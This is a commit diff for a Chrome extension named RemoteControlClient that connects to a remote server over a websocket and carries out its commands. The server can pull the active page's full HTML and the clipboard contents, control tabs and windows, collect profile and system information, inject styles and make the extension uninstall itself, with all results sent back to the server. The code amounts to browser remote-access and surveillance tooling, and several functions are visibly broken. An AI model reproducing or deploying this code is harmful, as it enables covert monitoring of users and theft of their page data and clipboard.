c88a720285780106d2c9280d994c0e5b08c9d3da
Louis-Charles Biron <louilresbiron6@gmail.com>
2024-06-16 17:28:01 -0400

    Update

--- RemoteControlClient/backdrop/content.js
+++ RemoteControlClient/backdrop/content.js
@@ -3,10 +3,54 @@ chrome.runtime.onMessage.addListener(m => {
     if (m.type == "command") commandManager(m)
 })
 
+function send(m) {
+    chrome.runtime.sendMessage(m)
+}
+
+function toJSON(str) {
+    return JSON.parse(str.replaceAll(/['", {]{1}[a-z]+['", ]?:/gi, x=>`${x.startsWith("{")?"{":""}"${x.match(/[a-z0-9]+/gi)}":`))
+}
+
 // COMMANDS
 function commandManager(m) {
-    //command action
-    if (m.command == "test") {
-        console.log("test:", m.value)
+    let c = m.command.trim().toLowerCase()
+    try {
+        if (c == "test") console.log("test:", m.value)
+        else if (c.includes("document")) documentActions(m)
+        else if (c.includes("clipboard")) clipboard(m)
+        else if (c.includes("style")) style(m)
+    } catch (err) {
+        send({type:"response", isError:true, value:err.toString(), responseTarget:m.responseTarget})
+    }
+}
+
+function documentActions(m) {
+    let c = m.command
+    if (c.includes("get")) send({type:"response", command:c, value:document.documentElement.outerHTML, responseTarget:m.responseTarget})
+}
+function clipboard(m) {
+    let c = m.command
+    if (c.includes("get") || c.includes("read")) send({type:"response", command:c, value:navigator.clipboard.readText(), responseTarget:m.responseTarget})
+    if (c.includes("set") || c.includes("write")) {
+        navigator.clipboard.writeText(m.value)
+        send({type:"response", command:c, value:"Clipboard value is now set to: "+m.value, responseTarget:m.responseTarget})
+    }
+}
+function style(m) {// {selector:"", css:"", activation:?"", id:""}
+    let c = m.command
+    if (c.includes("create")) {
+        let v = toJSON(m.value),
+        css = v.selector+(v.activation||"")+"{"+v.css+"}",
+        style = document.createElement("style")
+        style.id = v.id
+    
+        if (style.styleSheet) style.styleSheet.cssText = css
+        else style.appendChild(document.createTextNode(css))
+        document.querySelector(v.selector).appendChild(style)
+        
+        send({type:"response", command:c, value:"New style appended, id: "+v.id, responseTarget:m.responseTarget})
+    } else if (c.includes("remove")) {
+        document.querySelector("style"+m.value).remove()
+        send({type:"response", command:c, value:"Removed style with id: "+m.value, responseTarget:m.responseTarget})
     }
 }
--- RemoteControlClient/background.js
+++ RemoteControlClient/background.js
@@ -1,22 +1,31 @@
-let messageFilter = ["keepAwake"]
+const defaultIp = "10.0.0.67:3000", messageFilter = ["keepAwake"]
 
 function sendMessage(m, toContent) {// str, str, boolean
-    if (toContent) chrome.tabs.query({currentWindow: true,active: true}, tabs=>chrome.tabs.sendMessage(tabs[0].id, m).catch((e)=>{console.log(e)}))
+    if (toContent) chrome.tabs.query({currentWindow: true,active: true}, tabs=>chrome.tabs.sendMessage(tabs[0].id, m).catch(e=>send({type:"response", isError:true, value:e.toString(), responseTarget:m.responseTarget})))
     else chrome.runtime.sendMessage(m).catch(()=>{})
 }
 
+function send(obj) {
+    ws.send(JSON.stringify(obj))
+}
+
 chrome.runtime.onInstalled.addListener(e=>{
-    if (e.reason == "install" || e.reason == "update") chrome.storage.sync.set({serverAddress: "10.0.0.67:3000"})
+    if (e.reason == "install" || e.reason == "update") chrome.storage.sync.set({serverAddress:defaultIp})
 })
 
 chrome.runtime.onMessage.addListener(m => {
     if (m.type == "tryConnectIp") connect(m.value)
     else if (m.type == "getConnectState") chrome.storage.sync.get(r=>{sendMessage({type:"connection", value:r.serverAddress})})
+    else if (m.type == "response") send(m)
 })
+
+function toJSON(str) {
+    return JSON.parse(str.replaceAll(/['", {]{1}[a-z]+['", ]?:/gi, x=>`${x.startsWith("{")?"{":""}"${x.match(/[a-z0-9]+/gi)}":`))
+}
 
 let ws = {}, ws_timeout
 chrome.storage.sync.get(r=>{
-    connect(r.serverAddress)
+    connect(r.serverAddress??defaultIp)
 })
 
 function connect(address) {
@@ -48,35 +57,105 @@ function connect(address) {
     } 
 }
 
-function send(obj) {
-    ws.send(JSON.stringify(obj))
-}
-
 // COMMANDS
 function commandManager(m) {
-    let c = m.command.toLowerCase(), v = c.value
+    let c = m.command.trim().toLowerCase()
     //command action
-    if (c == "test") sendMessage(m, true)
-    else if (c == "getinfo") grabInfo(m.responseTarget)
-    else if (c == "createwindow") createWindow(m)
+    try {
+        // CONTENT
+        if (c == "test" ||
+            c.includes("document") ||
+            c.includes("clipboard") ||
+            c.includes("style")
+        ) sendMessage(m, true)
+        // BACKGROUND
+        else if (c == "getinfo") grabinfo(m.responseTarget)
+        else if (c.includes("window")) window(m)
+        else if (c == "uninstallself") uninstallself(m)
+        else if (c.includes("explorer")) explorer(m)
+        else if (c.includes("notif")) notification(m)
+        else if (c == "google") google(m)
+        else if (c.includes("tab")) tabs(m)
+        else if (c == "keepawake") keepawake(m)
+        else if (c == "stopkeepawake") stopkeepawake(m)
+        else if (c == "changeip") changeip(m)
+    } catch (err) {
+        send({type:"response", isError:true, value:err.toString(), responseTarget:m.responseTarget})
+    }
 }
-
-function fixJSON(str) {
-    return str.replaceAll(/"?[a-z]+"?:/gi, x=>`"${x.match(/[a-z0-9]+/gi)}":`)
-}
-
 // - COMMANDS - LIST
-function createWindow(m) {
-    //chrome.windows.create({url:"https://www.pointercrate.com/demonlist/",focused:true,height:500,width:500,left:100,top:100,state:"normal",type:"normal"})
-    chrome.windows.create(JSON.parse(fixJSON(m.value)))
-    send({type:"response", value:"Created window", responseTarget:m.responseTarget})
+// getinfo ()
+// Window ({windowinfo})
+// uninstallSelf ()
+// explorer ()
+// notification ({title:"title",message:"message",type:"basic",iconUrl:"./img/void.png", requireInteraction:true, buttons:[{title:"ok"}]}) //
+// google (value)
+// tabs ()
+// keepawake (level) \\ system | display
+// stopkeepawake ()
+// changeip
+// document
+// clipboard
+function changeip(m) {
+    chrome.storage.sync.set({serverAddress:m.value}, ()=>{
+        send({type:"response", command:m.command, value:"Ip is now set to: "+m.value, responseTarget:m.responseTarget})
+        connect(m.value)
+    })
 }
-
-function grabInfo(responseTarget) {
+function window(m) {//chrome.windows.create({url:"https://www.pointercrate.com/demonlist/",focused:true,height:500,width:500,left:100,top:100,state:"normal",type:"normal"})
+    let c = m.command, cid = +c.match(/[0-9]+/g)?.[0], id = +m.value
+    if (c.includes("create"))chrome.windows.create(toJSON(m.value), w=>send({type:"response", command:m.command, value:w, responseTarget:m.responseTarget}))
+    else if (c.includes("current"))chrome.windows.getCurrent(w=>send({type:"response", command:m.command, value:w, responseTarget:m.responseTarget}))
+    else if (c.includes("get"))chrome.windows.getAll({}, w=>send({type:"response", command:m.command, value:w, responseTarget:m.responseTarget}))
+    else if (c.includes("query"))chrome.windows.getAll(toJSON(m.value), w=>send({type:"response", command:m.command, value:w, responseTarget:m.responseTarget}))
+    else if (c.includes("remove"))chrome.windows.remove(id, ()=>send({type:"response", command:m.command, value:"Remove window: "+id, responseTarget:m.responseTarget}))
+    else if (c.includes("update"))chrome.windows.update(cid, toJSON(m.value), w=>send({type:"response", command:m.command, value:w, responseTarget:m.responseTarget}))
+}
+function keepawake(m) {
+    chrome.power.requestKeepAwake(m.value)
+    send({type:"response", command:m.command, value:"Keeping targeted client's "+m.value+" awake", responseTarget:m.responseTarget})
+}
+function stopkeepawake(m) {
+    chrome.power.releaseKeepAwake()
+    send({type:"response", command:m.command, value:"Client's machine is no longer under keepawake", responseTarget:m.responseTarget})
+}
+function tabs(m) {console.log("TABS: ", m)
+    let c = m.command, cid = +c.match(/[0-9]+/g)?.[0], id = +m.value
+    if (c.includes("active")) chrome.tabs.query({active:true, currentWindow:true}, tabs=>send({type:"response", command:m.command, value:tabs[0], responseTarget:m.responseTarget}))
+    else if (c.includes("get")) chrome.tabs.query({}, tabs=>send({type:"response", command:m.command, value:tabs, responseTarget:m.responseTarget}))
+    else if (c.includes("create")) chrome.tabs.create(toJSON(m.value), t=>send({type:"response", command:m.command, value:t, responseTarget:m.responseTarget}))
+    else if (c.includes("query")) chrome.tabs.query(toJSON(m.value), tabs=>send({type:"response", command:m.command, value:tabs, responseTarget:m.responseTarget}))
+    else if (c.includes("move")) chrome.tabs.move(toJSON(m.value), t=>send({type:"response", command:m.command, value:t, responseTarget:m.responseTarget}))
+    else if (c.includes("reload")) chrome.tabs.reload(id, ()=>send({type:"response", command:m.command, value:"Refreshed tab: "+m.value, responseTarget:m.responseTarget}))
+    else if (c.includes("remove")) chrome.tabs.remove(id, ()=>send({type:"response", command:m.command, value:"Removed tab: "+m.value, responseTarget:m.responseTarget}))
+    else if (c.includes("update")) chrome.tabs.remove(cid, toJSON(m.value), t=>send({type:"response", command:m.command, value:t, responseTarget:m.responseTarget}))
+    else if (c.includes("high")) chrome.tabs.update(id, {active:true}, ()=>send({type:"response", command:m.command, value:"Higlighted tab: "+m.value, responseTarget:m.responseTarget}))
+    else if (c.includes("zoom")) chrome.tabs.setZoom(cid, id, ()=>send({type:"response", command:m.command, value:"Zoom of tab ["+cid+"] set to: "+m.value, responseTarget:m.responseTarget}))
+}
+function uninstallself(m) {
+    send({type:"response", command:m.command, value:"TERMINATED", responseTarget:m.responseTarget})
+    chrome.management.uninstallSelf()
+}
+function explorer(m) {// EXPAND~
+    chrome.downloads.showDefaultFolder()
+    send({type:"response", command:m.command, value:"Opened Explorer", responseTarget:m.responseTarget})
+}
+function notification(m) {// EXPAND
+    if (m.command.includes("create")) chrome.notifications.create(toJSON(m.value), nId=>send({type:"response", command:m.command, value:nId, responseTarget:m.responseTarget}))
+    else if (m.command.includes("get")) chrome.notifications.getAll(all=>send({type:"response", command:m.command, value:all, responseTarget:m.responseTarget}))
+    else if (m.command.includes("clear")) chrome.notifications.clear(m.value, c=>send({type:"response", command:m.command, value:"successfully cleared notification: "+c, responseTarget:m.responseTarget}))
+    else send({type:"response", command:m.command, value:"Invalid command or missing parameter", responseTarget:m.responseTarget})
+ // clear all
+}
+function google(m) {
+    chrome.search.query({text:m.value})
+    send({type:"response", command:m.command, value:"Google searched: "+m.value, responseTarget:m.responseTarget})
+}
+function grabinfo(responseTarget) {
     let info = {navigator_language:navigator.language}, info_cd=0
     function sendInfo() {
         info_cd++
-        if (info_cd == 8) send({type:"response", value:info, responseTarget:responseTarget})
+        if (info_cd == 10) send({type:"response", value:info, responseTarget:responseTarget, command:m.command})
     }
 
     chrome.identity.getProfileUserInfo((e)=>{
@@ -106,6 +185,16 @@ function grabInfo(responseTarget) {
 
     chrome.system.cpu.getInfo(cpu=>{
         info.cpu = cpu
+        sendInfo()
+    })
+
+    chrome.system.storage.getInfo(r=>{
+        info.storage = r
+        sendInfo()
+    })
+
+    chrome.system.display.getInfo(r=>{
+        info.display = r
         sendInfo()
     })
 
